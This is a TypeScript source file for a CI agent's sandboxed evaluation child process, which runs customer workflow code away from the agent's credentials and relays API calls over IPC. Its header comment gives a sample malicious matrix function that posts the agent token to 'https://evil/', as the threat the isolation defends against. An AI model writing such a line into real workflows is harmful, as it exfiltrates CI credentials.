/**
 * The eval child: the only process in which customer EVALUATION code runs.
 *
 * The agent forks it once per evaluation job (`__init__`, `__dynamic__`,
 * `__build__`, a global eval round) with a `buildSanitizedEnv` environment, so
 * the workflow module, its `filter`, its dynamic `env` / `environment` /
 * `concurrencyGroup` / `matrix` functions and any `DynamicJobFn` execute where
 * the agent's credentials are not. In the agent's own isolate, a pull request's
 * `matrix: async ({ env }) => fetch('https://evil/', { body: env.KICI_AGENT_TOKEN })`
 * would take the agent's identity.
 *
 * IPC shell only; evaluations live in `eval-dispatch.ts`. It uses its own
 * message union (`AgentToEvalMessage` / `EvalToAgentMessage`), NOT the step
 * runner's — `ipc-protocol.ts` explains why sharing it would expand privilege.
 */

import { toErrorMessage } from '@kici-dev/shared';
import { buildKiciApi } from '@kici-dev/sdk/internal';
import type { LogStream } from '@kici-dev/engine';
import type { AgentToEvalMessage, EvalToAgentMessage } from './ipc-protocol.js';
import { installConsoleCapture } from '../console-capture.js';
import { runEvalRequest } from './eval-dispatch.js';

/** A closed channel is not fatal — the agent has moved on. */
function send(msg: EvalToAgentMessage): void {
  try {
    process.send?.(msg);
  } catch {
    // The agent gave up on this evaluation.
  }
}

function emit(line: string, stream?: LogStream): void {
  send(stream ? { type: 'log.line', line, stream } : { type: 'log.line', line });
}

// --- Agent API relay (the one privileged message on this union) ---

let apiSeq = 0;
const pendingApiCalls = new Map<
  string,
  { resolve: (v: unknown) => void; reject: (e: Error) => void }
>();

/**
 * Relay one `kici.*` call to the agent. `ctx.kici` is already handed to a
 * `DynamicJobFn` and a global-eval generator, so this grants nothing new.
 */
function relayApiRequest(method: string, params: Record<string, unknown>): Promise<unknown> {
  const id = `eval-api-${++apiSeq}`;
  return new Promise<unknown>((resolve, reject) => {
    pendingApiCalls.set(id, { resolve, reject });
    send({ type: 'eval.api.request', id, method, params });
  });
}

const kici = buildKiciApi((method, params) => relayApiRequest(method, params ?? {}));

// --- Bootstrap ---

// Route customer `console.*` onto the job's log; this child's stdout is unread.
installConsoleCapture();

process.on('message', (msg: AgentToEvalMessage) => {
  if (msg.type === 'eval.api.response') {
    const pending = pendingApiCalls.get(msg.id);
    if (!pending) return;
    pendingApiCalls.delete(msg.id);
    if (msg.error !== undefined) pending.reject(new Error(msg.error));
    else pending.resolve(msg.result);
    return;
  }

  if (msg.type !== 'eval') return;
  void runEvalRequest(msg.request, { emit, kici }).then(
    (result) => {
      send({ type: 'eval.result', result });
      // Exit rather than idle: a customer module may have left a timer or handle behind.
      process.exit(0);
    },
    (err) => {
      send({ type: 'eval.error', error: toErrorMessage(err) });
      process.exit(1);
    },
  );
});

send({ type: 'ready' });
